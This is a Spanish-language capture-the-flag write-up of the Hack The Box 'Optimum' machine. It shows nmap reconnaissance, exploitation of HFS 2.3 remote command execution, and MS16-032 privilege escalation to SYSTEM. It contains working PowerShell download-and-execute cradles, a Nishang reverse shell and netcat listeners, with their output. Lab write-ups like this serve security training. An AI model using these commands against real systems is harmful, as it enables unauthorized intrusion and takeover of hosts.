---
title: Hack The Box Optimum
author: k4miyo
date: 2021-09-15
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Windows]
ping: true
---

## Optimum
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.8.

```bash
❯ ping -c 1 10.10.10.8
PING 10.10.10.8 (10.10.10.8) 56(84) bytes of data.
64 bytes from 10.10.10.8: icmp_seq=1 ttl=127 time=145 ms

--- 10.10.10.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 144.869/144.869/144.869/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.8 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-06 21:50 CDT
Initiating SYN Stealth Scan at 21:50
Scanning 10.10.10.8 [65535 ports]
Discovered open port 80/tcp on 10.10.10.8
Completed SYN Stealth Scan at 21:50, 26.45s elapsed (65535 total ports)
Nmap scan report for 10.10.10.8
Host is up, received user-set (0.14s latency).
Scanned at 2021-09-06 21:50:00 CDT for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 19 (836B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.8
   5   │     [*] Open ports: 80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p80 10.10.10.8 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-06 21:55 CDT
Nmap scan report for 10.10.10.8
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds
```

Observamos sólo el puerto 80 abierto, por lo que procedemos a ocupar la herramienta `whatweb` para obtener información adicioal. 

```bash
❯ whatweb http://10.10.10.8/
http://10.10.10.8/ [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
```

Aqui podemos ver el uso de **HTTP File Server 2.3**, lo que también podemos validar vía web.

![""](/assets/images/htb-optimum/optimum_web.png)

A continuación, procedemos a buscar un exploit público con el uso de la herramienta `searchsploit`:

```bash
❯ searchsploit HTTP File Server 2.3
------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                   |  Path
------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                      | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                      | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                   | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                              | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                              | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                         | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                      | windows/webapps/49125.py
------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Para este caso, ocuparemos el archivo *windows/remote/49584.py*, por lo que procedemos a descargarlos a nuestra máquina y observamos su contenido.

```bash
❯ searchsploit -m windows/webapps/49125.py
  Exploit: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49125
     Path: /usr/share/exploitdb/exploits/windows/webapps/49125.py
File Type: UTF-8 Unicode text, with CRLF line terminators

Copied to: /home/kamiyo/Documentos/HTB/Optimum/exploits/49125.py
```

Dentro de los comentarios del script, observamos un ejemplo de uso:

```bash
python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"
```

En donde podemos observar que es necesario las variables *rhost*, *rport*; así como también es necesario compartir un servidor **HTTP** en nuestra máquina de atacante compartiendo un archivo *ps1* para obtener una reverse shell. Por lo tanto, primeramente es necesario identificar el archivo **Invoke-PowerShellTcp.ps1** (el cual debería estar en la ruta `/usr/share/nishang/Shells`); hacemos una copia de dicho archivo en nuestro espacio de trabajo y procedemos a editarlo agregando la siguiente linea hasta el final:

```bash
Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>
```

Ahora, compartimos un servidor HTTP con python en nuestro directorio en donde tenemos el archivo *ps1*:

```bash
❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Por último nos ponemos en escucha a traves del puerto 443 (*lport*) y procedemos a ejecutar el exploit:

```bash
❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.8 - - [06/Sep/2021 22:35:19] "GET /PS.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [06/Sep/2021 22:35:19] "GET /PS.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [06/Sep/2021 22:35:19] "GET /PS.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [06/Sep/2021 22:35:19] "GET /PS.ps1 HTTP/1.1" 200 -
```

```bash
❯ python HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/PS.ps1')"
http://10.10.10.8:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.10/PS.ps1%27%29.}
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49162
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
optimum\kostas
PS C:\Users\kostas\Desktop>
```

Ya tenemos acceso al sistema como el usuario **kostas** y podemos ver la flag *user.txt*. Procedemos a enumerar un poco el sistema para determinar como escalar privilegios.

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\kostas\Desktop>
systeminfo                                                                                                                  [27/27]
                                                                 
Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server      
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User   
Registered Organization:                                         
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          13/9/2021, 2:49:50 ??
System Manufacturer:       VMware, Inc.   
System Model:              VMware Virtual Platform
System Type:               x64-based PC   
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows     
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek       
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB       
Available Physical Memory: 3.457 MB       
Virtual Memory: Max Size:  5.503 MB       
Virtual Memory: Available: 4.916 MB       
Virtual Memory: In Use:    587 MB         
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB                                   
Logon Server:              \\OPTIMUM      
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120    
                           [06]: KB2931358                                                                                         
                           [07]: KB2931366                 
                           [08]: KB2933826          
                           [09]: KB2938772     
                           [10]: KB2949621       
                           [11]: KB2954879                                                                                         
                           [12]: KB2958262
						   [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Como podemos observar, el sistema presenta **Microsoft Windows Server 2012 R2 Standard 6.3.9600 N/A Build 9600**; por lo que buscando, encontramos un exploit público asociado a dicha versión de tecnología **MS16-032**. Ahora descargamos el archivo.

[MS16-032](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)

```bash
❯ wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
--2021-09-06 23:22:19--  https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.111.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 13789 (13K) [text/plain]
Grabando a: «Invoke-MS16032.ps1»

Invoke-MS16032.ps1               100%[=========================================================>]  13.47K  --.-KB/s    en 0.001s  

2021-09-06 23:22:20 (9.04 MB/s) - «Invoke-MS16032.ps1» guardado [13789/13789]
```

Editamos el archivo descargado agregando al final la siguiente linea (cambiar el valor de **lhost** por nuestra IP de atacante):

```bash
Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/PS.ps1')"
```

Nos compartimos un servidor HTTP con python y procedemos a ejecutar el siguiente comando para la obtención del archivo; así mismo, nos ponemos en escucha por el puerto 443:

```bash
❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.8 - - [07/Sep/2021 00:05:48] "GET /Invoke-MS16032.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [07/Sep/2021 00:05:59] "GET /PS.ps1 HTTP/1.1" 200 -
```

```bash
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10/Invoke-MS16032.ps1')
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!

PS C:\Users\kostas\Desktop>
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49206
Windows PowerShell running as user OPTIMUM$ on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
nt authority\system
PS C:\Users\kostas\Desktop>
```

Ya somos administradores del sistema y podemos visualizar la flags *root.txt*.
